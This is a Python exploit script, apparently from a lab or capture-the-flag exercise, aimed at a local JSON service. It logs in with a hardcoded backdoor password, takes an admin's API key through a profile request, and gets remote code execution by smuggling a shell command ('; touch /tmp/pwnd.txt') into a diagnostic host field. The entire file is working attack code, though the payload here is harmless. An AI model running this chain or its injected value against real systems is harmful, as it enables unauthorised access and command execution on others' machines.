import socket
import json

BACKDOOR_PASSWORD = "b4ckd00r_2019"

# Target Vars
target = "127.0.0.1"
port = 9999

# Data to send

username = input("[+} Enter user to log in with: ")

login = {
    "action": "login",
    "username": username,
    "password": BACKDOOR_PASSWORD
}

help = {
    "action": "help"
}

job = {
    "username": "admin",
    "action": "view_profile"
}

rce = {
    "action": "admin_run_diagnostic",
    "host": "127.0.0.1; touch /tmp/pwnd.txt"
}

# Function to send data
def send_json_data(s, data):
    print("[+] Sending Data")

    try:
        s.sendall(json.dumps(data).encode() + b"\n")
    except ConnectionError as e:
        print(e)

# Function to receive data
def recv_data(s):
    resp = json.loads(s.recv(1024).decode())

    if not resp:
        print("[-] Nothing received")

        exit(1)
    print("[+] Data Received: ", resp)
    return resp


# Function to connect to the target
def connect(target, port):
    print("[+] Attempting to connect to server")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, port))
        print(f"[+] Connected Succesfully to {target} {port} ")
        return s

    except TimeoutError:
        print("[-] Timed out, try again.")
        exit(1)
    except ConnectionError:
        print("[-] Connection error, make sure server is running.")
        exit(1)

def fetch_token(s, data):
    print("[+] Attempting to fetch token")

    try:
        s.sendall(json.dumps(data).encode() + b"\n")
        resp = json.loads(s.recv(1024).decode())
        
        if "token" in resp:
            print("[+] Token Received: ", resp["token"])
            return resp["token"]
        else:
            print(resp)
            exit(1)

    except ConnectionError as e:
        print(e)

def fetch_api_key(s, data):
    print("[+] Attempting to fetch API key")

    try:
        s.sendall(json.dumps(job).encode() + b"\n")
        resp = json.loads(s.recv(1024).decode())
        print(resp)

        if not resp:
            print("[-] No Repsonse")
            exit(1)
        return resp["api_key"]
    
    except TimeoutError as e:
        print(e)
        exit(1)
    except ConnectionError as e:
        print(e)
        exit(1)

def main():

    c = connect(target, port)
    job["token"] = fetch_token(c, login)
    job["api_key"] = fetch_api_key(c, job)
    job["action"] = "admin_run_diagnostic"
    job["host"] = "127.0.0.1; touch /tmp/pwnd.txt"

    send_json_data(c, job)

    resp = recv_data(c)
    if "PING" in resp["output"]:
        print("[+] RCE obtained")
    else:
        print("[-] Exploit unsuccessful")
main()